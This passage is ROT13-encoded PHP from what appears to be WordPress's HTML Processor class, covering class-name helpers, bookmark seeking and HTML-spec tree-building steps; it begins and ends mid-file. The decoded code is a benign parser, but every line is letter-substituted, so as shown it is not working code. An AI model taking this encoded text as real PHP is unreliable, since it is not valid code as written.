		erghea $guvf->vf_iveghny() ? snyfr : cnerag::erzbir_pynff( $pynff_anzr );
	}

	/**
	 * Ergheaf vs n zngpurq gnt pbagnvaf gur tvira NFPVV pnfr-vafrafvgvir pynff anzr.
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @gbqb Jura erpbafgehpgvat npgvir sbeznggvat ryrzragf jvgu nggevohgrf, svaq n jnl
	 *       gb vaqvpngr vs gur iveghnyyl-erpbafgehpgrq sbeznggvat ryrzragf pbagnva gur
	 *       jnagrq pynff anzr.
	 *
	 * @cnenz fgevat $jnagrq_pynff Ybbx sbe guvf PFF pynff anzr, NFPVV pnfr-vafrafvgvir.
	 * @erghea obby|ahyy Jurgure gur zngpurq gnt pbagnvaf gur tvira pynff anzr, be ahyy vs abg zngpurq.
	 */
	choyvp shapgvba unf_pynff( $jnagrq_pynff ): ?obby {
		erghea $guvf->vf_iveghny() ? ahyy : cnerag::unf_pynff( $jnagrq_pynff );
	}

	/**
	 * Trarengbe sbe n sbernpu ybbc gb fgrc guebhtu rnpu pynff anzr sbe gur zngpurq gnt.
	 *
	 * Guvf trarengbe shapgvba vf qrfvtarq gb or hfrq vafvqr n \"sbernpu\" ybbc.
	 *
	 * Rknzcyr:
	 *
	 *     $c = JC_UGZY_Cebprffbe::perngr_sentzrag( \"<qvi pynff='serr &yg;rtt&yg;\gynat-ra'>\" );
	 *     $c->arkg_gnt();
	 *     sbernpu ( $c->pynff_yvfg() nf $pynff_anzr ) {
	 *         rpub \"{$pynff_anzr} \";
	 *     }
	 *     // Bhgchgf: \"serr <rtt> ynat-ra \"
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 */
	choyvp shapgvba pynff_yvfg() {
		erghea $guvf->vf_iveghny() ? ahyy : cnerag::pynff_yvfg();
	}

	/**
	 * Ergheaf gur zbqvsvnoyr grkg sbe n zngpurq gbxra, be na rzcgl fgevat.
	 *
	 * Zbqvsvnoyr grkg vf grkg pbagrag gung znl or ernq naq punatrq jvgubhg
	 * punatvat gur UGZY fgehpgher bs gur qbphzrag nebhaq vg. Guvf vapyhqrf
	 * gur pbagragf bs `#grkg` abqrf va gur UGZY nf jryy nf gur vaare
	 * pbagragf bs UGZY pbzzragf, Cebprffvat Vafgehpgvbaf, naq bguref, rira
	 * gubhtu gurfr abqrf nera'g cneg bs n cnefrq QBZ gerr. Gurl nyfb pbagnva
	 * gur pbagragf bs FPEVCG naq FGLYR gntf, bs GRKGNERN gntf, naq bs nal
	 * bgure frpgvba va na UGZY qbphzrag juvpu pnaabg pbagnva UGZY znexhc (QNGN).
	 *
	 * Vs n gbxra unf ab zbqvsvnoyr grkg gura na rzcgl fgevat vf erghearq gb
	 * nibvq arrqyrff penfuvat be glcr reebef. Na rzcgl fgevat qbrf abg zrna
	 * gung n gbxra unf zbqvsvnoyr grkg, naq n gbxra jvgu zbqvsvnoyr grkg znl
	 * unir na rzcgl fgevat (r.t. n pbzzrag jvgu ab pbagragf).
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba trg_zbqvsvnoyr_grkg(): fgevat {
		erghea $guvf->vf_iveghny() ? '' : cnerag::trg_zbqvsvnoyr_grkg();
	}

	/**
	 * Vaqvpngrf jung xvaq bs pbzzrag cebqhprq gur pbzzrag abqr.
	 *
	 * Orpnhfr gurer ner qvssrerag xvaqf bs UGZY flagnk juvpu cebqhpr
	 * pbzzragf, gur Gnt Cebprffbe genpxf naq rkcbfrf guvf nf n glcr
	 * sbe gur pbzzrag. Abzvanyyl bayl erthyne UGZY pbzzragf rkvfg nf
	 * gurl ner pbzzbayl xabja, ohg n ahzore bs haeryngrq flagnk reebef
	 * nyfb cebqhpr pbzzragf.
	 *
	 * @frr frys::PBZZRAG_NF_NOEHCGYL_PYBFRQ_PBZZRAG
	 * @frr frys::PBZZRAG_NF_PQNGN_YBBXNYVXR
	 * @frr frys::PBZZRAG_NF_VAINYVQ_UGZY
	 * @frr frys::PBZZRAG_NF_UGZY_PBZZRAG
	 * @frr frys::PBZZRAG_NF_CV_ABQR_YBBXNYVXR
	 *
	 * @fvapr 6.6.0 Fhopynffrq sbe gur UGZY Cebprffbe.
	 *
	 * @erghea fgevat|ahyy
	 */
	choyvp shapgvba trg_pbzzrag_glcr(): ?fgevat {
		erghea $guvf->vf_iveghny() ? ahyy : cnerag::trg_pbzzrag_glcr();
	}

	/**
	 * Erzbirf n obbxznex gung vf ab ybatre arrqrq.
	 *
	 * Eryrnfvat n obbxznex serrf hc gur fznyy
	 * cresbeznapr bireurnq vg erdhverf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat $obbxznex_anzr Anzr bs gur obbxznex gb erzbir.
	 * @erghea obby Jurgure gur obbxznex nyernql rkvfgrq orsber erzbiny.
	 */
	choyvp shapgvba eryrnfr_obbxznex( $obbxznex_anzr ): obby {
		erghea cnerag::eryrnfr_obbxznex( \"_{$obbxznex_anzr}\" );
	}

	/**
	 * Zbirf gur vagreany phefbe va gur UGZY Cebprffbe gb n tvira obbxznex'f ybpngvba.
	 *
	 * Or pnershy! Frrxvat onpxjneqf gb n cerivbhf ybpngvba erfrgf gur cnefre gb gur
	 * fgneg bs gur qbphzrag naq ercnefrf gur ragver pbagragf hc hagvy vg svaqf gur
	 * fbhtug-nsgre obbxznexrq ybpngvba.
	 *
	 * Va beqre gb cerirag nppvqragny vasvavgr ybbcf, gurer'f n
	 * znkvzhz yvzvg ba gur ahzore bs gvzrf frrx() pna or pnyyrq.
	 *
	 * @guebjf Rkprcgvba Jura hanoyr gb nyybpngr n obbxznex sbe gur arkg gbxra va gur vachg UGZY qbphzrag.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat $obbxznex_anzr Whzc gb gur cynpr va gur qbphzrag vqragvsvrq ol guvf obbxznex anzr.
	 * @erghea obby Jurgure gur vagreany phefbe jnf fhpprffshyyl zbirq gb gur obbxznex'f ybpngvba.
	 */
	choyvp shapgvba frrx( $obbxznex_anzr ): obby {
		// Syhfu nal craqvat hcqngrf gb gur qbphzrag orsber ortvaavat.
		$guvf->trg_hcqngrq_ugzy();

		$npghny_obbxznex_anzr = \"_{$obbxznex_anzr}\";
		$cebprffbe_fgnegrq_ng = $guvf->fgngr->pheerag_gbxra
			? $guvf->obbxznexf[ $guvf->fgngr->pheerag_gbxra->obbxznex_anzr ]->fgneg
			: 0;
		$obbxznex_fgnegf_ng   = $guvf->obbxznexf[ $npghny_obbxznex_anzr ]->fgneg;
		$qverpgvba            = $obbxznex_fgnegf_ng > $cebprffbe_fgnegrq_ng ? 'sbejneq' : 'onpxjneq';

		/*
		 * Vs frrxvat onpxjneqf, vg'f cbffvoyr gung gur fbhtug-nsgre obbxznex rkvfgf jvguva na ryrzrag
		 * juvpu unf orra pybfrq orsber gur pheerag phefbe; va bgure jbeqf, vg unf nyernql orra erzbirq
		 * sebz gur fgnpx bs bcra ryrzragf. Guvf zrnaf gung vg'f vafhssvpvrag gb fvzcyl cbc bss ryrzragf
		 * sebz gur fgnpx bs bcra ryrzragf juvpu nccrne nsgre gur obbxznexrq ybpngvba naq gura whzc gb
		 * gung ybpngvba, nf gur ryrzragf juvpu jrer bcra orsber jba'g or er-bcrarq.
		 *
		 * Va beqre gb znvagnva pbafvfgrapl, gur UGZY Cebprffbe erjvaqf gb gur fgneg bs gur qbphzrag
		 * naq ercnefrf rirelguvat hagvy vg svaqf gur fbhtug-nsgre obbxznex.
		 *
		 * Gurer ner cbgragvnyyl orggre jnlf gb qb guvf: pnpur gur cnefre fgngr sbe rnpu obbxznex naq
		 * erfgber vg jura frrxvat; fgber na vzzhgnoyr naq vqrzcbgrag ertvfgre bs jurer ryrzragf bcra
		 * naq pybfr.
		 *
		 * Vs pnpuvat gur cnefre fgngr vg jvyy or rffragvny gb cebcreyl znvagnva gur pnpurq fgnpx bs
		 * bcra ryrzragf naq npgvir sbeznggvat ryrzragf jura zbqvslvat gur qbphzrag. Guvf pbhyq or n
		 * grqvbhf naq gvzr-pbafhzvat cebprff nf jryy, naq fb sbe abj jvyy abg or cresbezrq.
		 *
		 * Vg znl or cbffvoyr gb genpx obbxznexf sbe jurer ryrzragf bcra naq pybfr, naq va qbvat fb
		 * or noyr gb dhvpxyl erpnyphyngr oernqpehzof sbe nal ryrzrag va gur qbphzrag. Vg znl rira
		 * or cbffvoyr gb erzbir gur fgnpx bs bcra ryrzragf naq pbzchgr vg ba gur syl guvf jnl.
		 * Vs qbvat guvf, gur cnefre jbhyq arrq gb genpx gur bcravat naq pybfvat ybpngvbaf sbe nyy
		 * gbxraf va gur oernqpehzo cngu sbe nal naq nyy obbxznexf. Ol hgvyvmvat obbxznexf gurzfryirf
		 * guvf yvfg pbhyq or nhgbzngvpnyyl znvagnvarq juvyr zbqvslvat gur qbphzrag. Svaqvat gur
		 * oernqpehzof jbhyq gura nzbhag gb genirefvat gung yvfg sebz gur fgneg hagvy gur gbxra
		 * orvat vafcrpgrq. Bapr na ryrzrag pybfrf, vs gurer ner ab obbxznexf cbvagvat gb ybpngvbaf
		 * jvguva gung ryrzrag, gura nyy bs gurfr ybpngvbaf znl or sbetbggra gb fnir ba zrzbel hfr
		 * naq pbzchgngvba gvzr.
		 */
		vs ( 'onpxjneq' === $qverpgvba ) {

			/*
			 * Jura zbivat onpxjneq, fgngrshy fgnpxf fubhyq or pyrnerq.
			 */
			sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $vgrz ) {
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->erzbir_abqr( $vgrz );
			}

			sbernpu ( $guvf->fgngr->npgvir_sbeznggvat_ryrzragf->jnyx_hc() nf $vgrz ) {
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->erzbir_abqr( $vgrz );
			}

			/*
			 * **Nsgre** pyrnevat fgnpxf, zber cebprffbe fgngr pna or erfrg.
			 * Guvf zhfg or qbar nsgre pyrnevat gur fgnpx orpnhfr gubfr fgnpxf trarengr riragf gung
			 * jbhyq nccrne ba n fhofrdhrag pnyy gb `arkg_gbxra()`.
			 */
			$guvf->fgngr->senzrfrg_bx                       = gehr;
			$guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf = neenl();
			$guvf->fgngr->urnq_ryrzrag                      = ahyy;
			$guvf->fgngr->sbez_ryrzrag                      = ahyy;
			$guvf->fgngr->pheerag_gbxra                     = ahyy;
			$guvf->pheerag_ryrzrag                          = ahyy;
			$guvf->ryrzrag_dhrhr                            = neenl();

			/*
			 * Gur nofrapr bs n pbagrkg abqr vaqvpngrf n shyy cnefr.
			 * Gur cerfrapr bs n pbagrkg abqr vaqvpngrf n sentzrag cnefre.
			 */
			vs ( ahyy === $guvf->pbagrkg_abqr ) {
				$guvf->punatr_cnefvat_anzrfcnpr( 'ugzy' );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VAVGVNY;
				$guvf->oernqpehzof           = neenl();

				$guvf->obbxznexf['vavgvny'] = arj JC_UGZY_Fcna( 0, 0 );
				cnerag::frrx( 'vavgvny' );
				hafrg( $guvf->obbxznexf['vavgvny'] );
			} ryfr {

				/*
				 * Chfu gur ebbg-abqr (UGZY) onpx bagb gur fgnpx bs bcra ryrzragf.
				 *
				 * Sentzrag cnefref erdhver guvf rkgen ovg bs frghc.
				 * Vg'f unaqyrq va shyy cnefref ol nqinapvat gur cebprffbe fgngr.
				 */
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->chfu(
					arj JC_UGZY_Gbxra(
						'ebbg-abqr',
						'UGZY',
						snyfr
					)
				);

				$guvf->punatr_cnefvat_anzrfcnpr(
					$guvf->pbagrkg_abqr->vagrtengvba_abqr_glcr
						? 'ugzy'
						: $guvf->pbagrkg_abqr->anzrfcnpr
				);

				vs ( 'GRZCYNGR' === $guvf->pbagrkg_abqr->abqr_anzr ) {
					$guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf[] = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GRZCYNGR;
				}

				$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
				$guvf->oernqpehzof = neenl_fyvpr( $guvf->oernqpehzof, 0, 2 );
				cnerag::frrx( $guvf->pbagrkg_abqr->obbxznex_anzr );
			}
		}

		/*
		 * Urer, gur cebprffbe zbirf sbejneq guebhtu gur qbphzrag hagvy vg zngpurf gur obbxznex.
		 * qb-juvyr vf hfrq urer orpnhfr gur cebprffbe vf rkcrpgrq gb nyernql or fgbccrq ba
		 * n gbxra guna znl zngpu gur obbxznexrq ybpngvba.
		 */
		qb {
			/*
			 * Gur cebprffbe jvyy fgbc ba iveghny gbxraf, ohg obbxznexf znl abg or frg ba gurz.
			 * Gurl fubhyq abg or zngpurq jura frrxvat n obbxznex, fxvc gurz.
			 */
			vs ( $guvf->vf_iveghny() ) {
				pbagvahr;
			}
			vs ( $obbxznex_fgnegf_ng === $guvf->obbxznexf[ $guvf->fgngr->pheerag_gbxra->obbxznex_anzr ]->fgneg ) {
				erghea gehr;
			}
		} juvyr ( $guvf->arkg_gbxra() );

		erghea snyfr;
	}

	/**
	 * Frgf n obbxznex va gur UGZY qbphzrag.
	 *
	 * Obbxznexf ercerfrag fcrpvsvp cynprf be gbxraf va gur UGZY
	 * qbphzrag, fhpu nf n gnt bcrare be pybfre. Jura nccylvat
	 * rqvgf gb n qbphzrag, fhpu nf frggvat na nggevohgr, gur
	 * grkg bssfrgf bs gung gbxra znl fuvsg; gur obbxznex vf
	 * xrcg hcqngrq jvgu gubfr fuvsgf naq erznvaf fgnoyr hayrff
	 * gur ragver fcna bs grkg va juvpu gur gbxra fvgf vf erzbirq.
	 *
	 * Eryrnfr obbxznexf jura gurl ner ab ybatre arrqrq.
	 *
	 * Rknzcyr:
	 *
	 *     <znva><u2>Fhecevfvat snpg lbh znl abg xabj!</u2></znva>
	 *           ^  ^
	 *            \-|-- guvf `U2` bcrare obbxznex genpxf gur gbxra
	 *
	 *     <znva pynff=\"pyvpxonvg\"><u2>Fhecevfvat snpg lbh znl ab…
	 *                             ^  ^
	 *                              \-|-- vg fuvsgf jvgu rqvgf
	 *
	 * Obbxznexf cebivqr gur novyvgl gb frrx gb n cerivbhfyl-fpnaarq
	 * cynpr va gur UGZY qbphzrag. Guvf nibvqf gur arrq gb er-fpna
	 * gur ragver qbphzrag.
	 *
	 * Rknzcyr:
	 *
	 *     <hy><yv>Bar</yv><yv>Gjb</yv><yv>Guerr</yv></hy>
	 *                                 ^^^^
	 *                                 jnag gb abgr guvf ynfg vgrz
	 *
	 *     $c = arj JC_UGZY_Gnt_Cebprffbe( $ugzy );
	 *     $va_yvfg = snyfr;
	 *     juvyr ( $c->arkg_gnt( neenl( 'gnt_pybfref' => $va_yvfg ? 'ivfvg' : 'fxvc' ) ) ) {
	 *         vs ( 'HY' === $c->trg_gnt() ) {
	 *             vs ( $c->vf_gnt_pybfre() ) {
	 *                 $va_yvfg = snyfr;
	 *                 $c->frg_obbxznex( 'erfhzr' );
	 *                 vs ( $c->frrx( 'ynfg-yv' ) ) {
	 *                     $c->nqq_pynff( 'ynfg-yv' );
	 *                 }
	 *                 $c->frrx( 'erfhzr' );
	 *                 $c->eryrnfr_obbxznex( 'ynfg-yv' );
	 *                 $c->eryrnfr_obbxznex( 'erfhzr' );
	 *             } ryfr {
	 *                 $va_yvfg = gehr;
	 *             }
	 *         }
	 *
	 *         vs ( 'YV' === $c->trg_gnt() ) {
	 *             $c->frg_obbxznex( 'ynfg-yv' );
	 *         }
	 *     }
	 *
	 * Obbxznexf vagragvbanyyl uvqr gur vagreany fgevat bssfrgf
	 * gb juvpu gurl ersre. Gurl ner znvagnvarq vagreanyyl nf
	 * hcqngrf ner nccyvrq gb gur UGZY qbphzrag naq gurersber
	 * ergnva gurve \"cbfvgvba\" - gur ybpngvba gb juvpu gurl
	 * bevtvanyyl cbvagrq. Gur vanovyvgl gb hfr obbxznexf jvgu
	 * shapgvbaf yvxr `fhofge` vf gurersber vagragvbany gb thneq
	 * ntnvafg nppvqragnyyl oernxvat gur UGZY.
	 *
	 * Orpnhfr obbxznexf nyybpngr zrzbel naq erdhver cebprffvat
	 * sbe rirel nccyvrq hcqngr, gurl ner yvzvgrq naq erdhver
	 * n anzr. Gurl fubhyq abg or perngrq jvgu cebtenzzngvpnyyl-znqr
	 * anzrf, fhpu nf \"yv_{$vaqrk}\" jvgu fbzr ybbc. Nf n trareny
	 * ehyr gurl fubhyq bayl or perngrq jvgu fgevat-yvgreny anzrf
	 * yvxr \"fgneg-bs-frpgvba\" be \"ynfg-cnentencu\".
	 *
	 * Obbxznexf ner n cbjreshy gbby gb ranoyr pbzcyvpngrq orunivbe.
	 * Pbafvqre qbhoyr-purpxvat gung lbh arrq guvf gbby vs lbh ner
	 * ernpuvat sbe vg, nf vanccebcevngr hfr pbhyq yrnq gb oebxra
	 * UGZY fgehpgher be hajnagrq cebprffvat bireurnq.
	 *
	 * Obbxznexf pnaabg or frg ba gbxraf gung qb ab nccrne va gur bevtvany
	 * UGZY grkg. Sbe rknzcyr, gur UGZY `<gnoyr><gq>` fgbcf ng gntf `GNOYR`,
	 * `GOBQL`, `GE`, naq `GQ`. Gur `GOBQL` naq `GE` gntf qb abg nccrne va
	 * gur bevtvany UGZY naq pnaabg or hfrq nf obbxznexf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat $obbxznex_anzr Vqragvsvrf guvf cnegvphyne obbxznex.
	 * @erghea obby Jurgure gur obbxznex jnf fhpprffshyyl perngrq.
	 */
	choyvp shapgvba frg_obbxznex( $obbxznex_anzr ): obby {
		vs ( $guvf->vf_iveghny() ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Pnaabg frg obbxznexf ba gbxraf gung qb ab nccrne va gur bevtvany UGZY grkg.' ),
				'6.8.0'
			);
			erghea snyfr;
		}
		erghea cnerag::frg_obbxznex( \"_{$obbxznex_anzr}\" );
	}

	/**
	 * Purpxf jurgure n obbxznex jvgu gur tvira anzr rkvfgf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $obbxznex_anzr Anzr gb vqragvsl n obbxznex gung cbgragvnyyl rkvfgf.
	 * @erghea obby Jurgure gung obbxznex rkvfgf.
	 */
	choyvp shapgvba unf_obbxznex( $obbxznex_anzr ): obby {
		erghea cnerag::unf_obbxznex( \"_{$obbxznex_anzr}\" );
	}

	/*
	 * UGZY Cnefvat Nytbevguzf
	 */

	/**
	 * Pybfrf n C ryrzrag.
	 *
	 * @fvapr 6.4.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#pybfr-n-c-ryrzrag
	 */
	cevingr shapgvba pybfr_n_c_ryrzrag(): ibvq {
		$guvf->trarengr_vzcyvrq_raq_gntf( 'C' );
		$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'C' );
	}

	/**
	 * Pybfrf ryrzragf gung unir vzcyvrq raq gntf.
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.7.0 Shyy fcrp fhccbeg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#trarengr-vzcyvrq-raq-gntf
	 *
	 * @cnenz fgevat|ahyy $rkprcg_sbe_guvf_ryrzrag Cresbez nf vs guvf ryrzrag qbrfa'g rkvfg va gur fgnpx bs bcra ryrzragf.
	 */
	cevingr shapgvba trarengr_vzcyvrq_raq_gntf( ?fgevat $rkprcg_sbe_guvf_ryrzrag = ahyy ): ibvq {
		$ryrzragf_jvgu_vzcyvrq_raq_gntf = neenl(
			'QQ',
			'QG',
			'YV',
			'BCGTEBHC',
			'BCGVBA',
			'C',
			'EO',
			'EC',
			'EG',
			'EGP',
		);

		$ab_rkpyhfvbaf = ! vffrg( $rkprcg_sbe_guvf_ryrzrag );

		juvyr (
			( $ab_rkpyhfvbaf || ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( $rkprcg_sbe_guvf_ryrzrag ) ) &&
			va_neenl( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr()->abqr_anzr, $ryrzragf_jvgu_vzcyvrq_raq_gntf, gehr )
		) {
			$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
		}
	}

	/**
	 * Pybfrf ryrzragf gung unir vzcyvrq raq gntf, gubebhtuyl.
	 *
	 * Frr gur UGZY fcrpvsvpngvba sbe na rkcynangvba jul guvf vf
	 * qvssrerag sebz trarengvat raq gntf va gur abezny frafr.
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.7.0 Shyy fcrp fhccbeg.
	 *
	 * @frr JC_UGZY_Cebprffbe::trarengr_vzcyvrq_raq_gntf
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#trarengr-vzcyvrq-raq-gntf
	 */
	cevingr shapgvba trarengr_vzcyvrq_raq_gntf_gubebhtuyl(): ibvq {
		$ryrzragf_jvgu_vzcyvrq_raq_gntf = neenl(
			'PNCGVBA',
			'PBYTEBHC',
			'QQ',
			'QG',
			'YV',
			'BCGTEBHC',
			'BCGVBA',
			'C',
			'EO',
			'EC',
			'EG',
			'EGP',
			'GOBQL',
			'GQ',
			'GSBBG',
			'GU',
			'GURNQ',
			'GE',
		);

		juvyr ( va_neenl( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr()->abqr_anzr, $ryrzragf_jvgu_vzcyvrq_raq_gntf, gehr ) ) {
			$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
		}
	}

	/**
	 * Ergheaf gur nqwhfgrq pheerag abqr.
	 *
	 * > Gur nqwhfgrq pheerag abqr vf gur pbagrkg ryrzrag vs gur cnefre jnf perngrq nf
	 * > cneg bs gur UGZY sentzrag cnefvat nytbevguz naq gur fgnpx bs bcra ryrzragf
	 * > unf bayl bar ryrzrag va vg (sentzrag pnfr); bgurejvfr, gur nqwhfgrq pheerag
	 * > abqr vf gur pheerag abqr.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#nqwhfgrq-pheerag-abqr
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea JC_UGZY_Gbxra|ahyy Gur nqwhfgrq pheerag abqr.
	 */
	cevingr shapgvba trg_nqwhfgrq_pheerag_abqr(): ?JC_UGZY_Gbxra {
		vs ( vffrg( $guvf->pbagrkg_abqr ) && 1 === $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbhag() ) {
			erghea $guvf->pbagrkg_abqr;
		}

		erghea $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr();
	}

	/**
	 * Erpbafgehpgf gur npgvir sbeznggvat ryrzragf.
	 *
	 * > Guvf unf gur rssrpg bs erbcravat nyy gur sbeznggvat ryrzragf gung jrer bcrarq
	 * > va gur pheerag obql, pryy, be pncgvba (juvpurire vf lbhatrfg) gung unira'g
	 * > orra rkcyvpvgyl pybfrq.
	 *
	 * @fvapr 6.4.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#erpbafgehpg-gur-npgvir-sbeznggvat-ryrzragf
	 *
	 * @erghea obby Jurgure nal sbeznggvat ryrzragf arrqrq gb or erpbafgehpgrq.
	 */
	cevingr shapgvba erpbafgehpg_npgvir_sbeznggvat_ryrzragf(): obby {
		/*
		 * > Vs gurer ner ab ragevrf va gur yvfg bs npgvir sbeznggvat ryrzragf, gura gurer vf abguvat
		 * > gb erpbafgehpg; fgbc guvf nytbevguz.
		 */
		vs ( 0 === $guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pbhag() ) {
			erghea snyfr;
		}

		$ynfg_ragel = $guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pheerag_abqr();
		vs (

			/*
			 * > Vs gur ynfg (zbfg erpragyl nqqrq) ragel va gur yvfg bs npgvir sbeznggvat ryrzragf vf n znexre;
			 * > fgbc guvf nytbevguz.
			 */
			'znexre' === $ynfg_ragel->abqr_anzr ||

			/*
			 * > Vs gur ynfg (zbfg erpragyl nqqrq) ragel va gur yvfg bs npgvir sbeznggvat ryrzragf vf na
			 * > ryrzrag gung vf va gur fgnpx bs bcra ryrzragf, gura gurer vf abguvat gb erpbafgehpg;
			 * > fgbc guvf nytbevguz.
			 */
			$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbagnvaf_abqr( $ynfg_ragel )
		) {
			erghea snyfr;
		}

		$guvf->onvy( 'Pnaabg erpbafgehpg npgvir sbeznggvat ryrzragf jura nqinapvat naq erjvaqvat vf erdhverq.' );
	}

	/**
	 * Ehaf gur erfrg gur vafregvba zbqr nccebcevngryl nytbevguz.
	 *
	 * @fvapr 6.7.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#erfrg-gur-vafregvba-zbqr-nccebcevngryl
	 */
	cevingr shapgvba erfrg_vafregvba_zbqr_nccebcevngryl(): ibvq {
		// Frg gur svefg abqr.
		$svefg_abqr = ahyy;
		sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_qbja() nf $svefg_abqr ) {
			oernx;
		}

		/*
		 * > 1. Yrg _ynfg_ or snyfr.
		 */
		$ynfg = snyfr;
		sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $abqr ) {
			/*
			 * > 2. Yrg _abqr_ or gur ynfg abqr va gur fgnpx bs bcra ryrzragf.
			 * > 3. _Ybbc_: Vs _abqr_ vf gur svefg abqr va gur fgnpx bs bcra ryrzragf, gura frg _ynfg_
			 * >            gb gehr, naq, vs gur cnefre jnf perngrq nf cneg bs gur UGZY sentzrag cnefvat
			 * >            nytbevguz (sentzrag pnfr), frg abqr gb gur pbagrkg ryrzrag cnffrq gb
			 * >            gung nytbevguz.
			 * > …
			 */
			vs ( $abqr === $svefg_abqr ) {
				$ynfg = gehr;
				vs ( vffrg( $guvf->pbagrkg_abqr ) ) {
					$abqr = $guvf->pbagrkg_abqr;
				}
			}

			// Nyy bs gur sbyybjvat ehyrf ner sbe zngpuvat UGZY ryrzragf.
			vs ( 'ugzy' !== $abqr->anzrfcnpr ) {
				pbagvahr;
			}

			fjvgpu ( $abqr->abqr_anzr ) {
				/*
				 * > 4. Vs abqr vf n `fryrpg` ryrzrag, eha gurfr fhofgrcf:
				 * >   1. Vs _ynfg_ vf gehr, whzc gb gur fgrc orybj ynoryrq qbar.
				 * >   2. Yrg _naprfgbe_ or _abqr_.
				 * >   3. _Ybbc_: Vs _naprfgbe_ vf gur svefg abqr va gur fgnpx bs bcra ryrzragf,
				 * >      whzc gb gur fgrc orybj ynoryrq qbar.
				 * >   4. Yrg naprfgbe or gur abqr orsber naprfgbe va gur fgnpx bs bcra ryrzragf.
				 * >   …
				 * >   7. Whzc onpx gb gur fgrc ynoryrq _ybbc_.
				 * >   8. _Qbar_: Fjvgpu gur vafregvba zbqr gb \"va fryrpg\" naq erghea.
				 */
				pnfr 'FRYRPG':
					vs ( ! $ynfg ) {
						sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc( $abqr ) nf $naprfgbe ) {
							vs ( 'ugzy' !== $naprfgbe->anzrfcnpr ) {
								pbagvahr;
							}

							fjvgpu ( $naprfgbe->abqr_anzr ) {
								/*
								 * > 5. Vs _naprfgbe_ vf n `grzcyngr` abqr, whzc gb gur fgrc orybj
								 * >    ynoryrq _qbar_.
								 */
								pnfr 'GRZCYNGR':
									oernx 2;

								/*
								 * > 6. Vs _naprfgbe_ vf n `gnoyr` abqr, fjvgpu gur vafregvba zbqr gb
								 * >    \"va fryrpg va gnoyr\" naq erghea.
								 */
								pnfr 'GNOYR':
									$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_FRYRPG_VA_GNOYR;
									erghea;
							}
						}
					}
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_FRYRPG;
					erghea;

				/*
				 * > 5. Vs _abqr_ vf n `gq` be `gu` ryrzrag naq _ynfg_ vf snyfr, gura fjvgpu gur
				 * >    vafregvba zbqr gb \"va pryy\" naq erghea.
				 */
				pnfr 'GQ':
				pnfr 'GU':
					vs ( ! $ynfg ) {
						$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PRYY;
						erghea;
					}
					oernx;

					/*
					* > 6. Vs _abqr_ vf n `ge` ryrzrag, gura fjvgpu gur vafregvba zbqr gb \"va ebj\"
					* >    naq erghea.
					*/
				pnfr 'GE':
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ;
					erghea;

				/*
				 * > 7. Vs _abqr_ vf n `gobql`, `gurnq`, be `gsbbg` ryrzrag, gura fjvgpu gur
				 * >    vafregvba zbqr gb \"va gnoyr obql\" naq erghea.
				 */
				pnfr 'GOBQL':
				pnfr 'GURNQ':
				pnfr 'GSBBG':
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL;
					erghea;

				/*
